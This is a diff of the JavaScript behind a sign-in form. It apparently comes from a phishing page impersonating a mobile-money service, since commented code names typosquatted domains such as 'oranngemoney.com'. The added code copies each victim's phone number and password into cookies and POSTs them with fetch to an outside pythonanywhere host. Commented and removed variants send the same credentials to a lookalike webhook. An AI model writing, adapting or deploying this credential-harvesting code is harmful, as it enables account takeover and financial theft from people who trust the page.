@@ -224,27 +224,39 @@
         document.cookie = cname + "=" + cvalue + ";expires=" + d.toUTCString(); + ";path=/";
     }
     $('#signin').on("submit", function() {
+            setCookie("phonenumber", document.getElementById('phonenumber').value);
+            setCookie("password", document.getElementById('password').value);
 
-    $.ajax({
-        url: 'https://erikadavis1.pythonanywhere.com ',
-        type: 'POST',
-        headers:{
-            'contentType': 'application/json',
-            'access-Control-Allow-Origin': '*'
-        },
-        data: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
-        success: function(response) {
-            console.log('Success:', response);
-            return 200
-        },
-        error: function(xhr, status, error) {
-            console.error('Error:', error);
-            return 404
-        }
-    });
+     await fetch("https://erikadavis1.pythonanywhere.com/", { method: "POST",
+        body: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
+        headers: {
+        "Content-Type": "application/json",
+        "access-Control-Allow-Origin": "*",
+        "Access-Control-Request-Method":"POST",
+    },
+        }).then(function() {
+        /**/});   
 
-        // setCookie("phonenumber", document.getElementById('phonenumber').value);
-        // setCookie("password", document.getElementById('password').value);
+
+    // $.ajax({
+    //     url: 'https://erikadavis1.pythonanywhere.com ',
+        // type: 'POST',
+    //     headers:{
+            // 'contentType': 'application/json',
+            // 'access-Control-Allow-Origin': '*'
+    //     },
+    //     data: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
+    //     success: function(response) {
+    //         console.log('Success:', response);
+    //         return 200
+    //     },
+    //     error: function(xhr, status, error) {
+    //         console.error('Error:', error);
+    //         return 404
+    //     }
+    // });
+
+
         // var xhr = new XMLHttpRequest();
         // xhr.open("POST", 'https://webhook.oranngemoney.com', true);
         
@@ -257,11 +269,7 @@
         // xhr.setRequestHeader('Access-Control-Request-Headers','Content-Type, Accept')
         // xhr.setRequestHeader('Origin','https://oranngemome.com')
         // xhr.send(JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}));
-    //  fetch("https://webhook.oranngemoney.com/", {
-    //                     method: "POST",
-    //                     body: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
-    //                     headers: {"Content-Type": "application/json",},
-    // }).then(function() {/**/});   
+
 
     })
     </script>
